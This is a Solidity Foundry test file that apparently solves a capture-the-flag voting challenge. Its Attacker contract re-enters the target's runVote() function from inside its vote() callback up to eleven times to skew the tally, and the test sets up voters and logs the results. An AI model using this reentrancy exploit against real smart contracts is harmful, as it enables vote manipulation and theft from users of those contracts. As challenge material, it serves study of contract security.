// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Contract.sol";

contract Attacker {
    uint i = 0;
    address public target;

    constructor(address _target) {
        target = _target;
    }

    function vote() public returns (uint) {
        uint val = 1;

        if (i < 11)
        {
            i += 1;
            address(target).call(abi.encodeWithSignature("runVote()"));
        }

        return val;
    }
}

contract Testing is Test {
    Level level;
    Attacker attacker;

    AmoVoter amo = new AmoVoter();
    BokoVoter boko = new BokoVoter();
    NandoVoter nando = new NandoVoter();

    address hacker = address(0x1338);
    address voter = address(0x1339);

    function setUp() public {
        vm.prank(address(this));
        level = new Level();

        attacker = new Attacker(address(level));
    }

    function test_solve() public {
        uint c_amo;
        uint c_boko;
        uint c_nando;

        vm.deal(address(this), 100 ether);
        vm.deal(hacker, 100 ether);
        vm.deal(voter, 100 ether);

        vm.prank(hacker);
        address(level).call{value: 1 ether}(abi.encodeWithSignature("register(address)", address(attacker)));

        vm.startPrank(voter);
        for (uint256 i = 0; i < 10; i++) {
            address(level).call{value: 1 ether}(abi.encodeWithSignature("register(address)", address(nando)));
        }

        for (uint256 i = 0; i < 5; i++) {
            address(level).call{value: 1 ether}(abi.encodeWithSignature("register(address)", address(amo)));
        }

        vm.stopPrank();

        level.runVote();

        (c_amo, c_boko, c_nando) = level.getVoteCounter();

        console.log("Amo:", c_amo);
        console.log("Boko:", c_boko);
        console.log("Nando:", c_nando);
    }
}